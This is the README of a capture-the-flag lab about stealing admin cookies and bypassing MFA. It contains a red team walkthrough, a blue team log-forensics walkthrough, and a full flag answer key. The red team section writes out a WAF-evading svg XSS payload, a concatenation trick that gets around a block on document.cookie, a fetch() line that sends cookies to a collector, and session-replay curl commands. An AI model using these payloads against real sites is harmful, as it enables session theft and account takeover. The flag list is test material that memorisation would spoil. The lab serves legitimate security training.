# 🏴 CTF Cyber Range - Cookies Reuse & MFA Bypass

## Admin Feedback System | Red vs. Blue Team CTF Lab

> **Zone:** `feedback.admin.local`  
> **Flag Format:** `SCENARIO75{...}`

---

## 📋 Table of Contents

- [Overview](#overview)
- [Quick Start](#quick-start)
- [Architecture](#architecture)
- [Red Team Walkthrough](#-red-team-walkthrough-attack-path)
- [Blue Team Walkthrough](#-blue-team-walkthrough-forensics-path)
- [Flag Checklist](#-flag-checklist)
- [Troubleshooting](#troubleshooting)

---

## Overview

This CTF lab simulates a vulnerable **Admin Feedback System** with the following attack scenario:

1. **Reconnaissance** → Discover hidden endpoints and cookies
2. **Defense Evasion** → Bypass WAF and exploit XSS
3. **Initial Access** → Steal admin cookies and bypass MFA
4. **Dashboard Compromise** → Access admin dashboard with stolen session

The environment provides:
- 🔴 **Red Team Path**: Exploit the web application vulnerabilities
- 🔵 **Blue Team Path**: Analyze forensic logs to reconstruct the attack

---

## Quick Start

### Prerequisites
- Docker and Docker Compose installed
- Web browser (Firefox/Chrome recommended)
- Terminal with SSH client

### Launch the Lab

```bash
# Clone/navigate to project directory
cd ctf-test

# Build and start the container
docker-compose up -d --build

# Verify it's running
docker-compose ps

# View logs
docker-compose logs -f
```

### Access Points

| Service | URL/Command | Purpose |
|---------|-------------|---------|
| Web App | `http://localhost:3075` | Red Team - Attack Surface |
| SSH     | `ssh analyst@localhost -p 2275` | Blue Team - Forensics |
| SSH Creds | `analyst` / `blue_team_rocks` | Blue Team Login |

### Stop the Lab

```bash
docker-compose down
```

---

## Architecture

```
┌─────────────────────────────────────────────┐
│           Docker Container                   │
│         (feedback.admin.local)               │
│                                              │
│  ┌──────────────────────┐                    │
│  │   Node.js App        │  Port 3075 (HTTP)  │
│  │   (Express Server)   │◄────────────────── │
│  │   - Feedback Form    │                    │
│  │   - WAF (Partial)    │                    │
│  │   - MFA Bypass       │                    │
│  │   - Admin Dashboard  │                    │
│  └──────────────────────┘                    │
│                                              │
│  ┌──────────────────────┐                    │
│  │   SSH Server         │  Port 2275 (SSH)   │
│  │   (OpenSSH)          │◄────────────────── │
│  │   User: analyst      │                    │
│  └──────────────────────┘                    │
│                                              │
│  ┌──────────────────────┐                    │
│  │   /opt/admin/logs/   │                    │
│  │   - access.log       │  Forensic Logs     │
│  │   - error.log        │                    │
│  └──────────────────────┘                    │
└─────────────────────────────────────────────┘
```

---

## 🔴 Red Team Walkthrough (Attack Path)

### Phase 1: Reconnaissance

#### Step 1.1 - Check HTTP Headers
```bash
curl -I http://localhost:3075
```
Look at the `X-Powered-By` header to identify the technology.

> **Flag:** `SCENARIO75{Node.js}`

#### Step 1.2 - View Page Source
Open `http://localhost:3075` and view the HTML source (Ctrl+U). Look for ASCII art comments that contain hints.

> **Flag:** `SCENARIO75{robots.txt}`

#### Step 1.3 - Check robots.txt
```bash
curl http://localhost:3075/robots.txt
```
Output reveals hidden endpoints:
```
User-agent: *
Disallow: /api/verify-mfa
Disallow: /dashboard
```

> **Flags:** `SCENARIO75{/api/verify-mfa}`, `SCENARIO75{/dashboard}`

#### Step 1.4 - Check Cookies
Open browser DevTools → Application → Cookies. Notice the pre-authentication cookie:
- **Name:** `pre_mfa_session`
- **Value:** `pending_mfa_verification`
- **HttpOnly:** `false` (insecure!)

> **Flags:** `SCENARIO75{pre_mfa_session}`, `SCENARIO75{pending_mfa_verification}`, `SCENARIO75{False}`

---

### Phase 2: Defense Evasion (WAF Bypass)

#### Step 2.1 - Test Endpoint Method
```bash
# GET returns 405 - Method Not Allowed
curl http://localhost:3075/api/feedback

# POST is the correct method
curl -X POST -H "Content-Type: application/json" \
  -d '{"feedback":"test"}' \
  http://localhost:3075/api/feedback
```

> **Flag:** `SCENARIO75{POST}`

#### Step 2.2 - Test WAF with `<script>` Tag
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"feedback":"<script>alert(1)</script>"}' \
  http://localhost:3075/api/feedback
```
Response: HTTP 403 - Blocked by WAF.

> **Flag:** `SCENARIO75{403}`

#### Step 2.3 - Bypass WAF with `<svg>`
The WAF doesn't block HTML5 `<svg>` elements:
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"feedback":"<svg onload=alert(1)>"}' \
  http://localhost:3075/api/feedback
```
Response: HTTP 200 - Success! The SVG tag bypasses the WAF.

> **Flag:** `SCENARIO75{<svg>}`

#### Step 2.4 - Bypass Cookie Access Restriction
Direct `document.cookie` is blocked. Use JavaScript string concatenation:
```javascript
window['docu'+'ment']['coo'+'kie']
```

> **Flag:** `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`

#### Step 2.5 - Exfiltration Method
Use the `fetch` API to exfiltrate stolen cookies:

> **Flag:** `SCENARIO75{fetch}`

---

### Phase 3: Initial Access (MFA Bypass & Session Replay)

#### Step 3.1 - Craft the XSS Payload
Combine all bypasses into a single payload:
```html
<svg onload="fetch('/api/collect?c='+window['docu'+'ment']['coo'+'kie'])">
```

Submit this as feedback:
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"feedback":"<svg onload=\"fetch('"'"'/api/collect?c='"'"'+window['"'"'docu'"'"'+'"'"'ment'"'"']['"'"'coo'"'"'+'"'"'kie'"'"'])\">"}'  \
  http://localhost:3075/api/feedback
```

#### Step 3.2 - Capture the Admin Cookie
After a few seconds, the admin bot reviews the feedback and the XSS fires. Check captured cookies:
```bash
curl http://localhost:3075/api/captured
```

You'll see the admin's cookie with the `adm_sess` prefix:
```json
{
  "captured": [{
    "cookie": "pre_mfa_session=adm_sess_7f3c2a1b9e4d5678a0c1"
  }]
}
```

> **Flag:** `SCENARIO75{adm_sess}`

#### Step 3.3 - Bypass MFA with Cookie Replay
Set the stolen admin cookie and call the MFA endpoint:
```bash
curl -X POST \
  -b "pre_mfa_session=adm_sess_7f3c2a1b9e4d5678a0c1" \
  http://localhost:3075/api/verify-mfa
```

Response shows MFA bypassed:
```json
{"success": true, "message": "MFA verification successful.", "redirect": "/dashboard"}
```

> **Flag:** `SCENARIO75{/api/verify-mfa}`

#### Step 3.4 - Access Admin Dashboard
```bash
curl -b "pre_mfa_session=adm_sess_7f3c2a1b9e4d5678a0c1" \
  http://localhost:3075/dashboard
```

Or in the browser: Set cookie `pre_mfa_session=adm_sess_7f3c2a1b9e4d5678a0c1` and navigate to `/dashboard`.

The XSS payload is reflected in a container with CSS class `xss-payload`.

> **Flag:** `SCENARIO75{xss-payload}`

#### Step 3.5 - Capture the Final Flag
The admin dashboard displays the Red Team victory flag:

> **🏁 Flag:** `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`

---

## 🔵 Blue Team Walkthrough (Forensics Path)

### Connect to the Forensics Terminal

```bash
ssh analyst@localhost -p 2275
# Password: blue_team_rocks
```

### Step 1: Locate the Logs

```bash
ls -la /opt/admin/logs/
```

> **Flag:** `SCENARIO75{/opt/admin/logs}`

Two log files available:
- `access.log` - Nginx-style HTTP access log
- `error.log` - Nginx-style error/security log

> **Flag:** `SCENARIO75{/opt/admin/logs/error.log}`

---

### Step 2: Identify the Attacker

```bash
# Find unique IPs in the access log
awk '{print $1}' /opt/admin/logs/access.log | sort | uniq -c | sort -rn
```

Compare IPs and identify suspicious activity:

```bash
# Attacker IP: Lots of 4xx errors and scanning behavior
grep "404\|403\|401" /opt/admin/logs/access.log | awk '{print $1}' | sort | uniq -c
```

> **Flag (Attacker IP):** `SCENARIO75{10.10.14.50}`

```bash
# Determine attacker subnet
# 10.10.14.50 is in the 10.10.14.0/24 subnet
```

> **Flag (Subnet):** `SCENARIO75{10.10.14.0/24}`

---

### Step 3: Identify Normal Baseline Traffic

```bash
# Find the admin/legitimate user
grep "admin" /opt/admin/logs/access.log | awk '{print $1}' | sort -u
```

> **Flag (Admin IP):** `SCENARIO75{192.168.1.100}`

---

### Step 4: Analyze the Attacker's User-Agent

```bash
grep "10.10.14.50" /opt/admin/logs/access.log | head -1
```

> **Flag:** `SCENARIO75{Mozilla/5.0}`

---

### Step 5: Find WAF Blocks

```bash
# Look for WAF alerts in error.log
grep "WAF" /opt/admin/logs/error.log
```

Find the `<script>` block event:
```bash
grep "script" /opt/admin/logs/error.log
```

> **Flag (Blocked tag):** `SCENARIO75{<script>}`

Find the exact WAF block timestamp:
```bash
grep "18:50:15" /opt/admin/logs/error.log
```

> **Flag (WAF timestamp):** `SCENARIO75{18:50:15}`

---

### Step 6: Track Dashboard Access

```bash
# Find when attacker accessed /dashboard successfully
grep "10.10.14.50.*dashboard.*200" /opt/admin/logs/access.log
```

> **Flag (Status):** `SCENARIO75{200}`  
> **Flag (Timestamp):** `SCENARIO75{18:51:55}`

---

### Step 7: Analyze Exfiltration Headers

```bash
# Find X-Forwarded-For with Base64 data
grep -i "forwarded\|base64" /opt/admin/logs/error.log
```

Or find the unusual field in access.log:
```bash
# Look for lines with extra fields (Base64 in quotes)
awk -F'"' '{if(NF>6) print $0}' /opt/admin/logs/access.log
```

Extract the Base64 string (including the literal closing bracket `}`):

> **Flag (Base64):** `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}`

Check the length:
```bash
echo -n "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}" | wc -c
```

> **Flag (Length):** `SCENARIO75{44}`

---

### Step 8: Find Incident Response Alerts

```bash
# Find CRITICAL level alerts
grep "CRITICAL" /opt/admin/logs/error.log
```

> **Flag:** `SCENARIO75{CRITICAL}`

The "Cookie reuse" is flagged at CRITICAL level.

---

### Step 9: Find the Anomaly Event

```bash
grep "18:53:10" /opt/admin/logs/error.log
```

> **Flag (Timestamp):** `SCENARIO75{18:53:10}`  
> **Flag (String):** `SCENARIO75{Authentication bypass anomaly}`

---

### Step 10: Verify Attacker Never Accessed MFA Endpoint Directly

```bash
# Check if attacker ever accessed the MFA endpoint
grep "10.10.14.50" /opt/admin/logs/access.log | grep "/api/verify-mfa"
```

No results - the attacker never directly accessed the MFA endpoint in the access log.

> **Flag:** `SCENARIO75{No}`

---

### Step 11: Decode the Base64 Flag

The extracted string `UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}` consists of a Base64-encoded body and a literal `}` at the end:

```bash
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | base64 -d
# Output: PHANTOMGRID{BLUE_L0G_HUnt3r_M4st3r
# Append the literal '}' to complete the flag: PHANTOMGRID{BLUE_L0G_HUnt3r_M4st3r}
```

> **🏁 Final Blue Team Flag:** `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`

*(Note: The decoded flag maps to the scenario flag `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`)*

---

## 🏁 Flag Checklist

### Red Team Flags (Phase 1 - Reconnaissance)
| # | Flag | Category |
|---|------|----------|
| 1 | `SCENARIO75{Node.js}` | X-Powered-By Header |
| 2 | `SCENARIO75{robots.txt}` | HTML Source Code Clue |
| 3 | `SCENARIO75{/api/verify-mfa}` | robots.txt Hidden Path |
| 4 | `SCENARIO75{/dashboard}` | Admin Area Path |
| 5 | `SCENARIO75{pre_mfa_session}` | Cookie Name |
| 6 | `SCENARIO75{pending_mfa_verification}` | Cookie Value |

### Red Team Flags (Phase 2 - Defense Evasion)
| # | Flag | Category |
|---|------|----------|
| 7 | `SCENARIO75{POST}` | Endpoint Method |
| 8 | `SCENARIO75{403}` | WAF Block Status |
| 9 | `SCENARIO75{<svg>}` | WAF Bypass Element |
| 10 | `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` | Cookie Obfuscation |
| 11 | `SCENARIO75{False}` | HttpOnly Attribute |
| 12 | `SCENARIO75{fetch}` | Exfiltration API |

### Red Team Flags (Phase 3 - Initial Access)
| # | Flag | Category |
|---|------|----------|
| 13 | `SCENARIO75{adm_sess}` | Session Prefix |
| 14 | `SCENARIO75{xss-payload}` | CSS Class Name |
| 15 | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}` | 🏁 Final Red Flag |

### Blue Team Flags (Forensics)
| # | Flag | Category |
|---|------|----------|
| 16 | `SCENARIO75{/opt/admin/logs}` | Log Location |
| 17 | `SCENARIO75{10.10.14.50}` | Attacker IP |
| 18 | `SCENARIO75{10.10.14.0/24}` | Attacker Subnet |
| 19 | `SCENARIO75{Mozilla/5.0}` | Attacker User-Agent |
| 20 | `SCENARIO75{192.168.1.100}` | Admin Baseline IP |
| 21 | `SCENARIO75{/opt/admin/logs/error.log}` | Error Log Path |
| 22 | `SCENARIO75{<script>}` | WAF Blocked Tag |
| 23 | `SCENARIO75{18:50:15}` | WAF Block Timestamp |
| 24 | `SCENARIO75{200}` | Dashboard Access Status |
| 25 | `SCENARIO75{18:51:55}` | Dashboard Access Time |
| 26 | `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}` | Base64 Exfil Header |
| 27 | `SCENARIO75{44}` | Base64 String Length |
| 28 | `SCENARIO75{CRITICAL}` | Incident Log Level |
| 29 | `SCENARIO75{18:53:10}` | Anomaly Timestamp |
| 30 | `SCENARIO75{Authentication bypass anomaly}` | Anomaly String |
| 31 | `SCENARIO75{No}` | Attacker MFA Access |
| 32 | `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}` | 🏁 Final Blue Flag |

**Total: 32 Flags** (15 Red Team + 17 Blue Team)

---

## Troubleshooting

### Container won't start
```bash
# Check logs
docker-compose logs

# Rebuild from scratch
docker-compose down
docker-compose up -d --build --force-recreate
```

### SSH connection refused
```bash
# Wait a few seconds for SSH to start, then try:
ssh -o StrictHostKeyChecking=no analyst@localhost -p 2275
```

### Cannot access web application
```bash
# Check if the container is running
docker ps

# Check if port 3075 is in use
ss -tlnp | grep 3075

# Try accessing health endpoint
curl http://localhost:3075/health
```

### Reset the lab
```bash
docker-compose down -v
docker-compose up -d --build
```

---

## ⚠️ Disclaimer

This CTF lab is designed for **educational purposes only**. The vulnerabilities are intentionally introduced for security training. Do not deploy this application in production or use these techniques on systems without proper authorization.

---

*Built for CTF Cyber Range - Cookie Reuse & MFA Bypass Training*
